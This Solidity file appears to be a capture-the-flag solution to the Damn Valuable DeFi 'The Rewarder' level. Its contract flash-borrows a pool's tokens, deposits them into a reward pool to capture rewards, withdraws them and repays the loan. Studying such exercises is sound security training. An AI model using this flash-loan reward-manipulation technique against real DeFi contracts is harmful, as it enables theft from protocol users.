// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

import "hardhat/console.sol";

contract RewarderAttacker {
    DamnValuableToken immutable i_token;
    FlashLoanerPool immutable i_pool;
    TheRewarderPool immutable i_rewarder;

    constructor(address _token, address _pool, address _rewarder) {
        i_token = DamnValuableToken(_token);
        i_pool = FlashLoanerPool(_pool);
        i_rewarder = TheRewarderPool(_rewarder);
    }

    function attack() external {
        i_pool.flashLoan(i_token.balanceOf(address(i_pool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Balance: ", i_token.balanceOf(address(this)));
        i_token.approve(address(i_rewarder), amount);
        i_rewarder.deposit(amount);
        console.log("Balance: ", i_token.balanceOf(address(this)));
        i_rewarder.withdraw(amount);
        console.log("Balance: ", i_token.balanceOf(address(this)));
        i_token.transfer(address(i_pool), amount);
    }
}
